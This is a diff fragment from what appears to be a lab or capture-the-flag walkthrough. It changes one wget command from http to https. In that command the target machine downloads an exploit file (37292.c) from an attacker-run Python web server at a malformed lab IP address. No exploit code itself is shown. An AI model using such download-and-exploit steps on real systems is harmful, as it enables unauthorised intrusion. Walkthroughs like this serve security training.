@@ -449,7 +449,7 @@ python3 -m http.server
 
 Step 4: on the Target machine download the exploit file, 37292.c
 ```
-wget http://10.10198.10:8000/ofc
+wget https://10.10198.10:8000/ofc
 ```
 Step 5: 
 
